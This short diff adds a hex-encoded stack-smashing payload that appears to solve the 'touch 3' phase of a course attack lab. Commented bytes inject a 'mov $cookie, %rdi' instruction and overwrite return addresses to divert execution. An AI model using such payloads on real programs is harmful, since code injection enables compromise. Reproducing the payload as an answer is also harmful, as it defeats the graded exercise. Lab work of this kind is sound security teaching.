@@ -1,0 +1,12 @@
+/* filling the stack */
+/* injected instruction mov $cookie, %rdi */
+/* return 2: c3 returns to return 1 */
+bf 3e 54 66 55 c3 35 39
+37 61 30 37 36 61 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+/* return 1: returns to injected instruction address */
+38 54 66 55 00 00 00 00
+/* return 3: returns to touch 3 */
+dc 17 40 00 00 00 00 00
